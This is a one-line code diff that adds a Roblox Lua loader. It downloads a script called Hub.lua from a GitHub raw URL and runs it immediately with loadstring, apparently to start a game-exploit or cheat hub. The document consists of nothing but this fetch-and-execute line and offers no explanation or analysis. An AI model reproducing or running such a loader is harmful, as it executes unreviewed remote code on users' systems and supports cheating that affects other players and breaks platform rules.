@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/sTempestHUB/scripts/main/Hub.lua', true))()
